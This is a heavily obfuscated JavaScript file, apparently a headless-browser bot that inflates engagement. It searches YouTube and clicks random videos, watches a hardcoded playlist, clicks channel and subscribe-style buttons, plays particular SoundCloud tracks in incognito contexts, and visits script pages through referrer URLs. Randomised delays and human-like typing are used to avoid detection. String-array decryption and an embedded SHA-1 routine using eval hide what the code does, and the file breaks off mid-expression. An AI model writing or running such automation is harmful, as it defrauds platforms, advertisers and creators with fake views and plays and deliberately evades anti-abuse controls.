const a4 = b,
  a3 = c,
  a2 = d;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x1b4d + 0x1247 * 0x2 + 0x16 * -0x2e7))) + i;
}
async function createPage(f, h) {
  const R = d;
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + R(0x26)](-0x6 * -0x3f8 + -0x158d + 0x1 * -0x243), await i['goto'](h, {
    'waitUntil': ['domcontent' + R(0x5)],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0x65 * 0x1bf + 0x353 + 0x8 * 0x2447 + (0x3ae6 + 0x10 * 0x68b + -0x68fe) * random()) : await standardWaitForNetIdle(f), await wait(0x1713 + -0xdb6 + 0xa2b + (-0xa48 * 0x5 + -0x18ae + 0x363 * 0x22) * random()), 0x11fb * -0x2 + -0x2f2 * 0x7 + 0x3895 * 0x1;
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x1ebb * 0x1 + -0xb70 + 0x3db3), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x56d * -0x2 + 0x1d * -0x133 + -0x21 * -0x162;
}
async function randomWait() {
  return await wait(-0x1c53 + 0x1046 + 0x2df * 0xb + (0x217c + -0x2 * -0xf01 + -0x2bf6) * random()), -0x8c9 + 0xb13 * 0x3 + -0x186f;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0x1516 * -0x1 + -0xa50 + -0xac6, -0x23b * 0x4 + 0x8c6 + 0x2d), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0xdbf5 * -0x1 + 0x17720 + -0x168b5) * getRandomInt(-0x922 + -0x1067 * -0x2 + -0x1d2 * 0xd, 0x139 * 0x5 + 0x17dc + -0x1df4), h)), -0x1765 + 0x14cf + 0x1 * 0x297;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0xcb * -0x2d + 0x294 + 0x28d * -0xf;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0x1b * 0x7e + 0x138f + -0x644]['split']('\x20');
    for (let k = 0x5 * 0x1 + 0x3a * 0x29 + -0x1 * 0x94f; k < i['length']; k += 0x152c + 0x141a + 0x14a2 * -0x2)
      j += i[k] * h[i[k + (0x22d3 * -0x1 + -0x402 + 0x26d6)]];
    return j;
  });
}
async function anchorAndView(f) {
  const S = d;
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + S(0x27) + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0xf * 0xb1 + 0xea2 * 0x1 + -0x18fb)['map'](l => Array['from'](l['children']))['flat'](0x303 * 0x7 + -0x175 * 0xf + 0x1 * 0xc7)['map'](l => l['childNodes'][0x15cb * -0x1 + 0x1164 * -0x1 + -0x1398 * -0x2]['childNodes'][0x414 + -0x11d3 + 0xdbf]['childNodes'][-0x2013 + -0x2e7 * 0x5 + 0x2e97]['childNodes'][0xe76 + -0x953 + -0x1 * 0x523]['childNodes'][0x1e68 + 0x25fc + -0x11f * 0x3d]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x1 * -0xa7f + 0x2435 + -0x15ce, 0x1ed9 + -0x1a37 * 0x1 + 0xee6 * 0x1)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x223a + -0xaeb * 0x5 + 0x4ef5);
  const h = await getMaxTime(f),
    i = Math['min']((0x13145 + -0x3aff * -0x1 + -0x81e4) * getRandomInt(-0x1a91 + -0x12ec + 0x2d7f, -0x1178 + 0x13ae + -0xb * 0x33), h);
  return await wait(i), 0x1 * 0x523 + 0x76e + 0x430 * -0x3;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x123 * 0x7 + -0x170d + 0x1f02);
    let h = e[f];
    if (b['VqUsWt'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x606 + 0x1266 + -0xc60, s, t, u = -0x1 * 0x1477 + 0xc89 * 0x2 + -0x49b; t = n['charAt'](u++); ~t && (s = r % (0x1b4d + 0x1247 * 0x2 + 0x3b * -0x115) ? s * (-0x6 * -0x3f8 + -0x158d + 0x1 * -0x203) + t : t, r++ % (-0x23 * 0xd7 + 0x8e + 0x1 * 0x1cdb)) ? p += String['fromCharCode'](0x13a2 + 0x2 * 0x1173 + -0x3589 & s >> (-(0x1713 + -0xdb6 + -0x95b) * r & -0x66d * 0x4 + -0xc57 + 0x79d * 0x5)) : 0x11fb * -0x2 + -0x2f2 * 0x7 + 0x3894 * 0x1) {
          t = o['indexOf'](t);
        }
        for (let v = -0x1ebb * 0x1 + -0xb70 + 0x2a2b, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x56d * -0x2 + 0x1d * -0x133 + -0x7 * -0x687))['slice'](-(-0x1c53 + 0x1046 + 0x1b9 * 0x7));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x217c + -0x2 * -0xf01 + -0x3f7e,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x8c9 + 0xb13 * 0x3 + -0x1870; u < -0x1516 * -0x1 + -0xa50 + -0x9c6; u++) {
          p[u] = u;
        }
        for (u = -0x23b * 0x4 + 0x8c6 + 0x26; u < -0x1255 * -0x1 + 0x1f43 + -0x3098; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x922 + -0x1067 * -0x2 + -0xb56 * 0x2), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x139 * 0x5 + 0x17dc + -0x1df9, q = -0x1765 + 0x14cf + 0x1 * 0x296;
        for (let v = -0xcb * -0x2d + 0x294 + 0x28d * -0xf; v < n['length']; v++) {
          u = (u + (-0x1b * 0x7e + 0x138f + -0x644)) % (0x5 * 0x1 + 0x3a * 0x29 + -0x1 * 0x84f), q = (q + p[u]) % (0x152c + 0x141a + 0x2846 * -0x1), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x22d3 * -0x1 + -0x402 + 0x27d5)]);
        }
        return t;
      };
      b['qfrnDR'] = m, c = arguments, b['VqUsWt'] = !![];
    }
    const j = e[0xf * 0xb1 + 0xea2 * 0x1 + -0x1901],
      k = f + j,
      l = c[k];
    return !l ? (b['prXVKF'] === undefined && (b['prXVKF'] = !![]), h = b['qfrnDR'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x1 * -0xbb + -0xa7b + 0x5 * 0x23e]['children'][-0x263f + -0xdd6 + 0x3415]['children'][-0x1 * 0x439 + -0x12a * 0x12 + 0x192d]['children'][-0x1490 + -0x19 * 0xaa + 0x47 * 0x86]['children'][0x430 * -0x7 + 0x1 * 0x1373 + 0x5 * 0x1f9]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x2238 + 0x21b2 + -0x87 * -0x1;
}
async function searchAndView(f) {
  const V = c;
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    const U = d,
      T = b;
    let j = Array['from'](document['querySelec' + 'torAll'](T(0x29, 'ci9s')));
    document['getElement' + 'ById'](U(0xc) + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + V(0x1), searchTerms['random'](), {
    'delay': 0x359 + -0x1611 + 0x131c * 0x1 + (-0x12e3 + -0xb6 + 0x13cb) * random()
  }), await wait(0xbb * 0x13 + -0x17b4 + 0xbc7 + (-0xf3 * 0x1d + 0x543 * 0x2 + 0x122d) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0xb0d + 0xc43 * -0x3 + 0x293 * 0xa]['childNodes'][0x1123 + -0x2038 + 0xf16 * 0x1]['childNodes'][0x1 * 0x59 + -0x1 * 0x56f + 0x517]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0x234e + -0x2311 + 0x2 * 0x2332]['childNodes'][-0x1 * 0x22bd + -0x4 * -0x14e + -0x1d85 * -0x1]['childNodes'][-0x38d * -0x3 + -0x5bc * -0x1 + -0x1061]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x1342 + -0x13e9 + -0xda * -0x2e),
          r = 0x528 + 0x92 * -0x2c + -0x1 * -0x13f0;
        for (let u = 0x3 * -0x537 + -0x35d + 0x1302; u < q['length']; u += -0x1bf8 + 0xa88 + -0x2 * -0x8b9)
          r += q[u] * k[q[u + (0x173a + 0x4af * -0x1 + -0x128a)]];
        return r;
      }(n);
  });
  await wait((-0x310e + -0x1f66 * -0x1 + -0xf40 * -0x5) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0xcb64 + 0x4884 + 0x8 * -0x531) * getRandomInt(0xfdc + 0x896 + -0x1871, 0x647 * -0x2 + 0xd7 + 0xbc1), h + (0x1afb * -0x1 + 0x198e + 0x14f5));
  return await wait(i), 0xd * -0xbf + -0x1ebe + 0x2872;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x11b * 0x11 + -0x77 * 0x44 + 0xcd1 * 0x1), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0x3 * -0x3b9 + -0x3c7 * 0x4 + -0x25ff * -0x1 + (-0x18b7 + 0x1276 * -0x1 + 0x2c5 * 0x11) * Math['random']());
    });
  }, -0x31 * 0x3 + 0x5f9 * 0x5 + -0x53 * 0x6);
  await wait(0x1 * -0x6e489 + 0x60868 + 0x57001);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0xe708 + -0x1d423 + 0x1d77b) * getRandomInt(0x1df * 0x7 + -0x5b * -0x19 + -0x4c * 0x4a, 0x1 * 0x1de5 + -0x1296 + -0xb36)), clearInterval(h), 0x35e * 0x2 + -0x2 * -0x11f2 + -0x2a9f;
}

function a() {
  const bu = [
    'ChrZlZqZmdi1mW',
    'B3HszwfS',
    'Ahr0Chm6lY9NCG',
    'CMCVzw4VC2nYAq',
    'Kit/537.36',
    'loaded',
    'W7VdKLZcIMecw8kj',
    'W6FdH8krW6DcWOBcSCooW7/cVW',
    'tonsEveryw',
    'axios',
    'nZHKEw15zZG4CG',
    'rg/scripts',
    '__searchBo',
    'Aw5KzxHpzG',
    'tfnlx0CXCunrDW',
    'zw51C2vYANmUBW',
    'yMXVy2SSx01puG',
    'sByClassNa',
    'Bsi7DJ0I',
    'CMCVC2nYAxb0CW',
    'ro__foregr',
    'kSohbxRdGq',
    'ENzJvvLztJfZEa',
    'a-commenta',
    'env',
    'meType',
    'zs8Q',
    'W4T6cmkSWOFdPgmCgCk+',
    '%BD%ACmark',
    'WOtdQH3dR8k/WPVcKW3cTNi',
    'DxnLCKfJDgLVBG',
    'easyfork.o',
    'yxzPzIXPBwfNzq',
    'xUmB6BpZBE',
    'worried-ab',
    'e3ZdOmkwDI7cTZv3ya',
    's8oxsuhcSb0VW5zIWRS',
    'e/youtube.',
    'Timeout',
    'e-scope:nt',
    'B3HWqxzJnNreua',
    'qCkem8kRW53dR8k7'
  ];
  a = function() {
    return bu;
  };
  return a();
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x10a * -0x1d + -0xe12 * 0x2 + 0x3a46;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0x556 * 0x3 + -0x119a + 0x199;
    await randomWait();
  }
  return 0x19e9 + -0x1 * -0x7b + 0x23 * -0xc1;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x123 * 0x7 + -0x170d + 0x1f02);
    let h = e[f];
    if (c['xRyaNI'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x606 + 0x1266 + -0xc60, r, s, t = -0x1 * 0x1477 + 0xc89 * 0x2 + -0x49b; s = m['charAt'](t++); ~s && (r = q % (0x1b4d + 0x1247 * 0x2 + 0x3b * -0x115) ? r * (-0x6 * -0x3f8 + -0x158d + 0x1 * -0x203) + s : s, q++ % (-0x23 * 0xd7 + 0x8e + 0x1 * 0x1cdb)) ? o += String['fromCharCode'](0x13a2 + 0x2 * 0x1173 + -0x3589 & r >> (-(0x1713 + -0xdb6 + -0x95b) * q & -0x66d * 0x4 + -0xc57 + 0x79d * 0x5)) : 0x11fb * -0x2 + -0x2f2 * 0x7 + 0x3894 * 0x1) {
          s = n['indexOf'](s);
        }
        for (let u = -0x1ebb * 0x1 + -0xb70 + 0x2a2b, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x56d * -0x2 + 0x1d * -0x133 + -0x7 * -0x687))['slice'](-(-0x1c53 + 0x1046 + 0x1b9 * 0x7));
        }
        return decodeURIComponent(p);
      };
      c['pNuEYm'] = i, b = arguments, c['xRyaNI'] = !![];
    }
    const j = e[0x217c + -0x2 * -0xf01 + -0x3f7e],
      k = f + j,
      l = b[k];
    return !l ? (h = c['pNuEYm'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}

function fetchRandomSC() {
  const W = d;
  return Math['random']() <= 0x4 * 0xec + 0xc44 + 0xff4 * -0x1 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0x588 + -0x323 + -0x1 * 0x265 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + W(0x22) + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    const Y = b;
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0x9b9 + -0x5f * -0x47 + -0x10a0 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0x1 * -0x1bbb + 0x2316 + -0x75b;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          const X = d;
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + X(0x14) + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0xd33e + 0x1 * -0x15bc9 + 0x13853 + getRandomInt(-0x4209 + 0x170f * -0x1 + 0x93b0, 0xa0e6 + -0x1ec1 * -0x5 + -0xc57b));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0x2517 + -0x2355 + 0x1 * -0x1c1), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x2 * -0x34e + 0x39 * -0x55 + 0x1989;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x1 * 0xbf5 + -0x4bf * 0x4 + 0x707, -0x1d1 + -0x3 * 0x43 + -0x2 * -0x166)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s[Y(0x15, 'NPa)')](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x1dd4 + -0x8 * -0x101 + 0x1d9c + floor((0xbd3 * 0x1 + -0x1baa + 0x13bf * 0x1) * random()))), log('p2'), log(await s['evaluate'](() => {
        const a0 = d,
          Z = b;
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x62a38326 + -0x97bbe488 + -0x4344293 * -0x5a),
          0x5c831e * 0x1 + -0x13 * 0x47a5 + 0x2fb3 * 0xdb,
          -0x627e + 0x1 * -0xe1fd + 0x1c47b,
          -0x1067 + -0x22c8 + 0x33af
        ], y = [
          -0x1c13 + -0xe11 * 0x1 + 0x2a3c,
          -0xa * 0xc1 + 0x25c2 + -0x1e28,
          -0x2602 + 0x1a3e + -0x14 * -0x97,
          -0x943 + -0x1de8 + 0x272b
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x1e3a + -0x1 * 0x1f4 + 0x1c45 * -0x1)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0xb * 0x239 + 0xc95 + 0x62 * 0x1f; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x1e73 + -0x22d2 * 0x1 + 0x45f * 0x1) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x2328 + 0x1499 + -0x37c1] = A[-0xb53 * -0x3 + -0x1d03 + 0x13 * -0x42] = A[-0x656 * 0x3 + 0x2 * -0x91e + -0x773 * -0x5] = A[-0x1 * -0xe1d + -0x1cfc + 0x125 * 0xd] = A[-0x11 * -0x21d + 0x2 * 0x4c0 + -0x2d6a] = A[0x1570 + 0x1 * 0x24a1 + -0x3a0d] = A[0xd * -0x1d + -0x1 * 0x2417 + -0x42d * -0x9] = A[-0x89 * 0xe + 0x1 * -0x224b + 0x29cf] = A[0x1 * -0x1915 + -0x309 * -0x8 + 0xd4] = A[0x15a9 + 0xe3 * -0x21 + 0x7a2] = A[-0x24c0 * -0x1 + 0xaff + -0x1 * 0x2fb6] = A[0x232f + 0x306 + 0x3 * -0xcb9] = A[-0x3ca + 0x1a05 + 0x14 * -0x11c] = A[0x2 * 0x99f + -0x27f + 0x357 * -0x5] = A[0x1 * 0x797 + 0x2 * 0x2ce + -0xd26] = A[-0x160d + -0x8 * -0x133 + 0xc83] = A[0x1 * -0x15e4 + 0x1e71 + 0x1 * -0x87e] = -0x2430 + 0x1eb * 0xd + -0x1 * -0xb41, this['blocks'] = A) : this['blocks'] = [
                -0x7 * 0x248 + 0x169c * -0x1 + -0x1 * -0x2694,
                -0x4a7 * 0x7 + 0x2181 + -0xf0,
                -0x235d + -0x1951 * 0x1 + 0x2 * 0x1e57,
                0x59 * 0x65 + -0x1fb0 + 0x1 * -0x36d,
                0x1 * 0x1424 + 0x1e35 + -0x3259 * 0x1,
                0x20f5 + -0x9d7 + -0x21a * 0xb,
                -0x6e4 * 0x2 + 0x1902 + -0x2 * 0x59d,
                0x9d6 + 0x2 * -0x382 + 0x26 * -0x13,
                -0x83b * 0x1 + 0x7be * -0x2 + 0x1d3 * 0xd,
                0xfe3 + -0x156c + 0x589,
                -0x1072 * 0x1 + 0x22f4 + -0x1282,
                0x1162 + 0x2684 + -0x37e6,
                0xdeb + 0x1e70 + -0x2c5b,
                0x13b8 + 0x1 * -0x2042 + 0xc8a,
                0x11ea + 0x234 * -0xe + 0x1 * 0xcee,
                0x2e * -0x84 + 0x35b * 0x8 + -0x320,
                0x1a99 + -0x1f2 * 0x10 + 0x487
              ], this['h0'] = -0x2a69de94 + 0xbd3856d6 + 0x26f61 * -0x11e1, this['h1'] = -0x136aa584 * 0xa + 0x147625a + 0x13 * 0x16c5ef2d, this['h2'] = 0xed7c0599 + 0xb34d390e + -0x1080e61a9, this['h3'] = -0xababa24 + 0x28a189e + 0x4 * 0x618bd7f, this['h4'] = 0x16444eb9c + 0x12d16f * 0x391 + -0xe38ef68b, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x481 * -0x5 + -0x25 * 0xa7 + -0x2ea8 * -0x1, this['finalized'] = this['hashed'] = -0x1b91 + 0x1353 + -0xa * -0xd3, this['first'] = -0x54d * -0x2 + 0x191c + -0x33f * 0xb;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0xf1 * 0x28 + 0x1f93 * 0x1 + 0x615, O = J['length'] || 0xcc5 + 0x9 * 0x157 + -0x18d4, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x1744 + -0x1471 * -0x1 + -0x2bb5 * 0x1, P[0x815 + -0x11f6 + 0x9e1] = this['block'], P[0x7 * -0x338 + 0xb7 * -0x1 + 0x174f] = P[0x3 * 0x862 + -0x19 * 0x37 + -0x2 * 0x9e3] = P[-0x2658 + 0x511 * 0x7 + 0x2e3] = P[0x1a8d + -0x21b * 0x6 + 0x2 * -0x6f4] = P[-0x1 * -0x1fc3 + -0x1c81 + 0x19f * -0x2] = P[-0x61 * 0x5 + -0x1 * 0x1bd + 0x3a7] = P[0x1 * 0x341 + 0x1e6b * -0x1 + -0x30 * -0x91] = P[-0x875 + 0x728 * -0x4 + 0x251c] = P[-0xd71 + -0x214d + -0x2 * -0x1763] = P[0x1cd * 0x2 + -0x9d9 * -0x1 + -0xd6a] = P[0x2583 + 0x24c + -0x27c5] = P[-0xfc9 + -0x27 * -0xfd + 0x5 * -0x48b] = P[-0x25 * 0x19 + 0x20ef * 0x1 + 0x1d46 * -0x1] = P[0x1388 + -0x5bc * -0x6 + -0x1f * 0x1bd] = P[0x1 * 0x899 + 0x55e + -0xde9] = P[0x7 * -0x27 + -0x3 * -0x881 + -0x3 * 0x821] = 0x303 + -0xd * 0xc9 + 0x732 * 0x1), K) {
                    for (N = this['start']; M < O && N < 0x33b * -0xa + 0x6e + 0x2020; ++M)
                      P[N >> -0x1c7 + -0xdee + 0xfb7] |= J[M] << y[0x3e * 0x7f + -0x1 * -0xe01 + 0x8 * -0x598 & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x8e1 * 0x1 + -0x12c6 + 0xa25; ++M)
                      (L = J['charCodeAt'](M)) < 0x2 * -0x1232 + -0x31 * -0xe + 0x97 * 0x3a ? P[N >> -0x21e5 * 0x1 + 0x814 + 0x19d3] |= L << y[-0x2 * -0xd64 + 0x5c + -0x90b * 0x3 & N++] : L < -0x2 * -0x7fb + -0x91a + 0x124 ? (P[N >> 0x56f * 0x1 + -0x199d + 0x4c * 0x44] |= (0x1e35 + -0x1 * -0x9ac + 0x35 * -0xbd | L >> 0xed * 0xb + 0x106c + -0x1a95) << y[0x3 * -0x3a3 + 0x1a3 * 0x4 + 0x460 & N++], P[N >> 0x7b5 + -0x85c + -0x1 * -0xa9] |= (-0x1a86 + -0x1 * -0x2333 + 0xa1 * -0xd | -0x92d + 0x1e4b + -0x14df & L) << y[0x862 + -0x397 * -0x3 + -0x1324 * 0x1 & N++]) : L < 0x14f16 + 0x1a317 + -0x21a2d || L >= 0x1ad1 * 0x1 + -0xc27a + 0x187a9 ? (P[N >> -0x2fe + 0x23f9 + 0x16f * -0x17] |= (-0x1 * 0x16de + 0x212a + -0x96c | L >> 0x1dc5 + -0x24b5 + 0x6fc) << y[-0xa01 + 0x321 + 0x6e3 & N++], P[N >> 0x4 * 0x2d2 + 0x180 + -0xcc6] |= (0x1d63 + 0x1 * -0xc33 + -0x10b0 | L >> -0x1 * 0xc7 + 0x22 * -0x122 + 0xf * 0x29f & 0x202f + -0xa3 * 0x1d + -0xd79) << y[-0xa5f + -0x151 * -0x4 + 0x51e & N++], P[N >> 0xf * 0x28f + -0x569 + 0x1 * -0x20f6] |= (-0x4 * 0x694 + 0x1 * 0x20c3 + 0x1 * -0x5f3 | 0x664 + 0x3b * -0x1 + 0x5ea * -0x1 & L) << y[-0x2 * -0x39a + 0x91a * -0x2 + 0xb03 & N++]) : (L = -0x8b4c + 0xa048 + -0x485 * -0x34 + ((-0x1b23 * 0x1 + -0x1d35 * -0x1 + 0x1ed & L) << -0x24d3 + 0x14a0 + 0x103d | -0x133c 